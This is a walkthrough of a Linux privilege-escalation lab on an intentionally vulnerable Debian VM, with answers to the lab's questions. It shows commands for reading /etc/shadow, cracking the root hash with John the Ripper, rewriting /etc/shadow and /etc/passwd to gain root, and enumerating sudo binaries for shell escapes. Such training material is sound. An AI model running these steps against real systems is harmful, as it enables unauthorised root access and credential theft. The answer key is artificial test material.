# Deploy the Vulnerable Debian Vm
Deploy the machine and login to the "user" account using SSH.
`ssh user@<ip_address>`
running the ssh normally will get an error. Because OpenSSH have deprecated ssh-rsa. add `-oHostKeyAlgorithms=+ssh-rsa`
`ssh user@<ip_address> `-oHostKeyAlgorithms=+ssh-rsa``
## no answer needed

## Run the "id" command. What is the result?
```
user@debian:~$ id
uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)
```
# Weak File Permissions - Readable /etc/shadow
```
cat /etc/shadow
root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::
```
copy the hash password of root into a file
`$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0`

use john the ripper to crack the password
```
$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Press 'q' or Ctrl-C to abort, almost any other key for status
password123      (?)     
1g 0:00:00:04 DONE (2024-08-15 06:14) 0.2450g/s 345.0p/s 345.0c/s 345.0C/s teacher..tagged
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

## What is the root user's password hash?
`$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0`

## What hashing algorithm was used to produce the root user's password hash?
sha512crypt

## What is the root user's password?
password123

# Weak File Permissions - Writeable /etc/shadow
```
user@debian:~$ mkpasswd -m sha-512 mypassword
$6$E5kvwX4w8pYzgJ$yAKFmW8cnbE59lC10b2hrrbOP2TuW6QBYdRxG0lcVTShlAVSFscUCNsYteaLVKvMDQfMHg0EofLjwh11EuA6r.
user@debian:~$ nano /etc/shadow
user@debian:~$ nano /etc/shadow
user@debian:~$ cat /etc/shadow | grep root
root:$6$E5kvwX4w8pYzgJ$yAKFmW8cnbE59lC10b2hrrbOP2TuW6QBYdRxG0lcVTShlAVSFscUCNsYteaLVKvMDQfMHg0EofLjwh11EuA6r.:17298:0:99999:7:::
```
## no answers needed

# Weak File Permissions - Writable /etc/passwd

```
user@debian:~$ ls -l /etc/passwd
-rw-r--rw- 1 root root 1009 Aug 25  2019 /etc/passwd
user@debian:~$ openssl passwd mypassword
Warning: truncating password to 8 characters
dPrN9TvixrQtE
user@debian:~$ nano /etc/passwd
```
`root:dPrN9TvixrQtE:0:0:root:/root:/bin/bash`
```
user@debian:~$ su root
Password: 
root@debian:/home/user# id
uid=0(root) gid=0(root) groups=0(root)
```
## Run the "id" command as the newroot user. What is the result?
uid=0(root) gid=0(root) groups=0(root)

# Sudo - Shell Escape Sequences
## How many programs is "user" allowed to run via sudo?
run the command in user not in the root shell
```
user@debian:~$ sudo -l
Matching Defaults entries for user on this host:
    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH

User user may run the following commands on this host:
    (root) NOPASSWD: /usr/sbin/iftop
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/nano
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/bin/man
    (root) NOPASSWD: /usr/bin/awk
    (root) NOPASSWD: /usr/bin/less
    (root) NOPASSWD: /usr/bin/ftp
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/sbin/apache2
    (root) NOPASSWD: /bin/more
```
11

## One program on the list doesn't have a shell escape sequence on GTFOBins. Which is it?
look up the list of programs
apache2

## Consider how you might use this program with sudo to gain root privileges without a shell escape sequence.
try some commands from those program to gain root shell
no answer needed

# Cron Jobs - PATH Environment Variable
## What is the value of the PATH variable in /etc/crontab?
```
cat /etc/crontab
/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
```